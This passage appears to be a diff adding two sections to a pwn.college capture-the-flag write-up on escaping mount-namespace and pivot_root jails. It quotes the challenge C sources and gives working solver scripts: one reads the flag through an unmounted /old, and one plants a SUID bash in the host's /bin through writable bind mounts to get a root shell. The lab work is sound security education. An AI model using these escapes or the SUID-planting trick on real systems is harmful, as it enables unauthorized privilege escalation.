@@ -3422,3 +3422,437 @@ Error: unknown command!
 [*] Got EOF while reading in interactive
 $  
 ```
+
+&nbsp;
+
+## mount-namespace
+
+> Learn the implications of a different way of sandboxing, using modern namespacing techniques! But what if the sandbox is really sloppy?
+
+```c title="/challenge/babyjail_level14.c" showLineNumbers
+#define _GNU_SOURCE 1
+
+#include <stdlib.h>
+#include <stdint.h>
+#include <stdbool.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <string.h>
+#include <time.h>
+#include <errno.h>
+#include <assert.h>
+#include <libgen.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <sys/socket.h>
+#include <sys/wait.h>
+#include <sys/signal.h>
+#include <sys/mman.h>
+#include <sys/ioctl.h>
+#include <sys/sendfile.h>
+#include <sys/prctl.h>
+#include <sys/personality.h>
+#include <arpa/inet.h>
+
+#include <sys/syscall.h>
+#include <sys/mount.h>
+#include <dirent.h>
+#include <limits.h>
+#include <sched.h>
+
+char hostname[128];
+
+int main(int argc, char **argv, char **envp)
+{
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 0);
+
+    printf("###\n");
+    printf("### Welcome to %s!\n", argv[0]);
+    printf("###\n");
+    printf("\n");
+
+    gethostname(hostname, 128);
+    if (strstr(hostname, "-level") && !strstr(hostname, "vm_"))
+    {
+        puts("ERROR: in the dojo, this challenge MUST run in virtualization mode.");
+        exit(1);
+    }
+
+    puts("This challenge will use mount namespace and pivot_root to put you into a jail in /tmp/jail-XXXXXX...\n");
+
+    for (int i = 3; i < 10000; i++) close(i);
+
+    char new_root[] = "/tmp/jail-XXXXXX";
+    char old_root[PATH_MAX];
+
+    puts("Checking that the challenge is running as root (otherwise things will fail)...");
+    assert(geteuid() == 0);
+
+    puts("Splitting off into our own mount namespace...");
+    assert(unshare(CLONE_NEWNS) != -1);
+
+    puts("Creating a jail structure!");
+    puts("... creating jail root...");
+    assert(mkdtemp(new_root) != NULL);
+    printf("... created jail root at `%s`.\n", new_root);
+
+    puts("... changing the old / to a private mount so that pivot_root succeeds later.");
+    assert(mount(NULL, "/", NULL, MS_REC | MS_PRIVATE, NULL) != -1);
+
+    puts("... bind-mounting the new root over itself so that it becomes a 'mount point' for pivot_root() later.");
+    assert(mount(new_root, new_root, NULL, MS_BIND, NULL) != -1);
+
+    puts("... creating a directory in which pivot_root will put the old root filesystem.");
+    snprintf(old_root, sizeof(old_root), "%s/old", new_root);
+    assert(mkdir(old_root, 0777) != -1);
+
+    puts("... pivoting the root filesystem!");
+    assert(syscall(SYS_pivot_root, new_root, old_root) != -1);
+
+    assert(mkdir("/bin", 0755) != -1);
+    puts("... bind-mounting /bin into the jail.");
+    assert(mount("/old/bin", "/bin", NULL, MS_BIND, NULL) != -1);
+
+    assert(mkdir("/usr", 0755) != -1);
+    puts("... bind-mounting /usr into the jail.");
+    assert(mount("/old/usr", "/usr", NULL, MS_BIND, NULL) != -1);
+
+    assert(mkdir("/lib", 0755) != -1);
+    puts("... bind-mounting /lib into the jail.");
+    assert(mount("/old/lib", "/lib", NULL, MS_BIND, NULL) != -1);
+
+    assert(mkdir("/lib64", 0755) != -1);
+    puts("... bind-mounting /lib64 into the jail.");
+    assert(mount("/old/lib64", "/lib64", NULL, MS_BIND, NULL) != -1);
+
+    setresuid(0, 0, 0);
+
+    puts("Moving the current working directory into the jail.\n");
+    assert(chdir("/") == 0);
+
+    int fffd = open("/flag", O_WRONLY | O_CREAT);
+    write(fffd, "FLAG{FAKE}", 10);
+    close(fffd);
+
+    puts("Executing a shell inside the sandbox! Good luck!");
+    assert(execl("/bin/bash", "/bin/bash", "-p", NULL) != -1);
+
+    printf("### Goodbye!\n");
+}
+```
+
+This challenge uses `pivot_root()` instead of `chroot()` to jail us.
+
+The process first creates an isolated mount namespace:
+
+```c
+# ---- snip ----
+
+unshare(CLONE_NEWNS)
+
+# ---- snip ----
+```
+
+It then creates a temporary jail directory, bind-mounts it over itself so it becomes a proper mount point, creates an `old` subdirectory inside it, and calls `pivot_root`:
+
+```c
+# ---- snip ----
+
+mount(new_root, new_root, NULL, MS_BIND, NULL) != -1
+
+# ---- snip ----
+
+syscall(SYS_pivot_root, new_root, old_root)
+
+# ---- snip ----
+```
+
+After this, `/` points to the new jail, and the previous real root filesystem is placed at `/old`.
+The challenge then bind-mounts `/old/bin`, `/old/usr`, `/old/lib`, and `/old/lib64` into the jail so that bash can run correctly inside it.
+
+Finally, a fake flag is written:
+
+```c
+# ---- snip ----
+
+int fffd = open("/flag", O_WRONLY | O_CREAT);
+write(fffd, "FLAG{FAKE}", 10);
+
+# ---- snip ----
+```
+
+And a shell is spawned:
+
+```c
+# ---- snip ----
+
+execl("/bin/bash", "/bin/bash", "-p", NULL)
+
+# ---- snip ----
+```
+
+The problem is that the challenge never unmounts `/old` after the pivot.
+
+A secure implementation would do:
+
+```c
+umount2("/old", MNT_DETACH);
+rmdir("/old");
+```
+
+Since neither of these is called, the entire original filesystem remains reachable through `/old`.
+
+### Exploit
+
+Since we are given a shell directly, the solve is trivial.
+
+```bash
+cat /old/flag
+```
+
+```python title="~/script.py" showLineNumbers
+from pwn import *
+
+context.log_level = "error"
+
+p = process("/challenge/babyjail_level14")
+
+p.recvuntil(b"Good luck!")
+
+p.sendline(b"cat /old/flag")
+
+p.interactive()
+```
+
+```
+hacker@sandboxing~mount-namespace:~$ python ~/script.py
+
+pwn.college{E1DzP23CAC0z2QF2rth1RBmawyx.ddDMzMDL4ITM0EzW}
+$  
+```
+
+&nbsp;
+
+## mount-namespace-2
+
+> Learn the implications of a different way of sandboxing, using modern namespacing techniques! But what if the sandbox is really sloppy?
+
+```c title="/challenge/babyjail_level15.c" showLineNumbers
+#define _GNU_SOURCE 1
+
+#include <stdlib.h>
+#include <stdint.h>
+#include <stdbool.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <string.h>
+#include <time.h>
+#include <errno.h>
+#include <assert.h>
+#include <libgen.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <sys/socket.h>
+#include <sys/wait.h>
+#include <sys/signal.h>
+#include <sys/mman.h>
+#include <sys/ioctl.h>
+#include <sys/sendfile.h>
+#include <sys/prctl.h>
+#include <sys/personality.h>
+#include <arpa/inet.h>
+
+#include <sys/syscall.h>
+#include <sys/mount.h>
+#include <dirent.h>
+#include <limits.h>
+#include <sched.h>
+
+char hostname[128];
+
+int main(int argc, char **argv, char **envp)
+{
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 0);
+
+    printf("###\n");
+    printf("### Welcome to %s!\n", argv[0]);
+    printf("###\n");
+    printf("\n");
+
+    gethostname(hostname, 128);
+    if (strstr(hostname, "-level") && !strstr(hostname, "vm_"))
+    {
+        puts("ERROR: in the dojo, this challenge MUST run in virtualization mode.");
+        exit(1);
+    }
+
+    puts("This challenge will use mount namespace and pivot_root to put you into a jail in /tmp/jail-XXXXXX...\n");
+
+    for (int i = 3; i < 10000; i++) close(i);
+
+    char new_root[] = "/tmp/jail-XXXXXX";
+    char old_root[PATH_MAX];
+
+    puts("Checking that the challenge is running as root (otherwise things will fail)...");
+    assert(geteuid() == 0);
+
+    puts("Splitting off into our own mount namespace...");
+    assert(unshare(CLONE_NEWNS) != -1);
+
+    puts("Creating a jail structure!");
+    puts("... creating jail root...");
+    assert(mkdtemp(new_root) != NULL);
+    printf("... created jail root at `%s`.\n", new_root);
+
+    puts("... changing the old / to a private mount so that pivot_root succeeds later.");
+    assert(mount(NULL, "/", NULL, MS_REC | MS_PRIVATE, NULL) != -1);
+
+    puts("... bind-mounting the new root over itself so that it becomes a 'mount point' for pivot_root() later.");
+    assert(mount(new_root, new_root, NULL, MS_BIND, NULL) != -1);
+
+    puts("... creating a directory in which pivot_root will put the old root filesystem.");
+    snprintf(old_root, sizeof(old_root), "%s/old", new_root);
+    assert(mkdir(old_root, 0777) != -1);
+
+    puts("... pivoting the root filesystem!");
+    assert(syscall(SYS_pivot_root, new_root, old_root) != -1);
+
+    assert(mkdir("/bin", 0755) != -1);
+    puts("... bind-mounting /bin into the jail.");
+    assert(mount("/old/bin", "/bin", NULL, MS_BIND, NULL) != -1);
+
+    puts("... though the mounts are independent, changes to the files themselves will propagate to the parent namespace!");
+    assert(mkdir("/usr", 0755) != -1);
+    puts("... bind-mounting /usr into the jail.");
+    assert(mount("/old/usr", "/usr", NULL, MS_BIND, NULL) != -1);
+
+    puts("... though the mounts are independent, changes to the files themselves will propagate to the parent namespace!");
+    assert(mkdir("/lib", 0755) != -1);
+    puts("... bind-mounting /lib into the jail.");
+    assert(mount("/old/lib", "/lib", NULL, MS_BIND, NULL) != -1);
+
+    puts("... though the mounts are independent, changes to the files themselves will propagate to the parent namespace!");
+    assert(mkdir("/lib64", 0755) != -1);
+    puts("... bind-mounting /lib64 into the jail.");
+    assert(mount("/old/lib64", "/lib64", NULL, MS_BIND, NULL) != -1);
+
+    puts("... though the mounts are independent, changes to the files themselves will propagate to the parent namespace!");
+
+    puts("... unmounting old root directory.");
+    assert(umount2("/old", MNT_DETACH) != -1);
+    assert(rmdir("/old") != -1);
+
+    setresuid(0, 0, 0);
+
+    puts("Moving the current working directory into the jail.\n");
+    assert(chdir("/") == 0);
+
+    int fffd = open("/flag", O_WRONLY | O_CREAT);
+    write(fffd, "FLAG{FAKE}", 10);
+    close(fffd);
+
+    puts("Executing a shell inside the sandbox! Good luck!");
+    assert(execl("/bin/bash", "/bin/bash", "-p", NULL) != -1);
+
+    printf("### Goodbye!\n");
+}
+```
+
+This level fixes the previous mistake — the old root is now properly detached after the pivot:
+
+```c
+puts("... unmounting old root directory.");
+assert(umount2("/old", MNT_DETACH) != -1);
+assert(rmdir("/old") != -1);
+```
+
+So `/old` is gone and the previous escape no longer works.
+
+### The Bug
+
+However, before unmounting `/old`, the challenge bind-mounts several directories from the real filesystem into the jail:
+
+```c
+assert(mount("/old/bin", "/bin", NULL, MS_BIND, NULL) != -1);
+assert(mount("/old/usr", "/usr", NULL, MS_BIND, NULL) != -1);
+assert(mount("/old/lib", "/lib", NULL, MS_BIND, NULL) != -1);
+assert(mount("/old/lib64", "/lib64", NULL, MS_BIND, NULL) != -1);
+```
+
+The source even hints at this:
+
+```c
+puts("... though the mounts are independent, changes to the files themselves will propagate to the parent namespace!");
+```
+
+These bind mounts are independent mount table entries that point directly at the underlying inodes of `/bin`, `/usr`, `/lib`, `/lib64` on the real host filesystem. Since the jail runs as root and these mounts are writable, any file we create inside `/bin` from within the jail is actually written to the real host's `/bin`.
+
+### Exploit
+
+We abuse the writable bind mount to plant a SUID bash binary into the real host's `/bin`.
+
+**Step 1** — From inside the jail, copy bash and set the SUID bit on it:
+
+```python
+from pwn import *
+
+context.log_level = "error"
+
+p = process("/challenge/babyjail_level15")
+
+p.recvuntil(b"Good luck!")
+
+p.sendline(b"cp /bin/bash /bin/bashsuid; chmod 4755 /bin/bashsuid")
+
+p.sendline(b"echo done")
+
+p.recvuntil(b"done")
+
+p.close()
+```
+
+Since `/bin` is bind-mounted from the real host, `/bin/bashsuid` now exists on the actual host filesystem with the SUID bit set.
+
+**Step 2** — From a terminal outside the jail, run it with `-p` to preserve SUID privileges:
+
+```bash
+/bin/bashsuid -p
+```
+
+This drops us into a root shell on the real host. Then:
+
+```bash
+cat /flag
+```
+
+### Solver
+
+```python
+from pwn import *
+
+context.log_level = "error"
+
+p = process("/challenge/babyjail_level15")
+
+p.recvuntil(b"Good luck!")
+
+p.sendline(b"cp /bin/bash /bin/bashsuid; chmod 4755 /bin/bashsuid")
+
+p.sendline(b"echo done")
+
+p.recvuntil(b"done")
+
+p.close()
+```
+
+Then from outside:
+
+```bash
+hacker@sandboxing~mount-cleanup:~$ /bin/bashsuid -p
+bashsuid-5.0# cat /flag
+pwn.college{IH60WiwTvVZzkOYQdXpKfLset9i.dhDMzMDL4ITM0EzW}
+```
